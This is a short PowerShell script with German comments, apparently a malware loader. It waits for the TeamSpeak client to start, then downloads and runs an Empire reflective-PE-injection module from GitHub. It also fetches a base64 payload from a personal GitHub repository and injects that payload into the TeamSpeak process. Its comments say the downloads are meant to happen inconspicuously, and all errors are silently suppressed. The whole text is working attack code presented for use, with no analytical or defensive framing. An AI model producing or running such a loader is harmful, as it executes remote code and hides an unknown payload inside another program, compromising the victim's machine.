$ErrorActionPreference = 'SilentlyContinue'

# Warten auf TeamSpeak
while (!(Get-Process ts3client_win64)) { Start-Sleep -Seconds 2 }
Start-Sleep -Seconds 5 

try {
    [Net.ServicePointManager]::SecurityProtocol = 3072
    
    # 1. Loader unauffällig laden
    $lUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
    $l = (iwr -UseBasicParsing $lUrl).Content
    Invoke-Expression $l

    # 2. Payload unauffällig laden
    $pUrl = "https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt"
    $b = (iwr -UseBasicParsing $pUrl).Content
    
    # Säubern des Strings (entfernt unsichtbare Zeichen, die den Fehler verursachen)
    $b = $b.Trim()
    $rb = [System.Convert]::FromBase64String($b)

    # 3. Injektion explizit auf TS3 ausrichten
    $target = Get-Process ts3client_win64
    Invoke-ReflectivePEInjection -PEBytes $rb -ProcId $target.Id -ForceASLR
} catch {
}
exit
